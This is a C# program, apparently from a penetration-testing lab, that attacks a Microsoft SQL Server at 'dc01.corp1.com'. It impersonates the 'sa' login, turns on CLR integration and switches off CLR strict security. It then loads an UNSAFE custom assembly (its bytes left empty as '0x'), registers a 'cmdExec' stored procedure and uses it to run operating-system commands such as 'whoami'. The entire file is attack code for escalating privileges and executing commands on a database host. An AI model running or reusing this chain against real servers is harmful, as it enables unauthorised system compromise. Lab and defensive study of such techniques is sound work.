using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
		    try
            {
              con.Open();
              Console.WriteLine("Auth success!");
            }
            catch
            {
              Console.WriteLine("Auth failed");
              Environment.Exit(0);
            }

            string impersonate = "EXECUTE AS LOGIN = 'sa';";
            SqlCommand sql = new SqlCommand(impersonate,con);
            SqlDataReader reader = sql.ExecuteReader();
            reader.Close();
			
			string config = "use msdb; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security',0;RECONFIGURE;";             
			sql = new SqlCommand(config,con);
            reader = sql.ExecuteReader();
            reader.Close();

			string asm = "CREATE ASSEMBLY my_assembly FROM 0x WITH PERMISSION_SET = UNSAFE;";
			sql = new SqlCommand(asm,con);
            reader = sql.ExecuteReader();
            reader.Close();

			string proc = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];";
			sql = new SqlCommand(proc,con);
            reader = sql.ExecuteReader();
            reader.Close();

			string x = "EXEC cmdExec 'whoami'";
			sql = new SqlCommand(x,con);
            reader = sql.ExecuteReader();
            reader.Close();
		}
	}
}
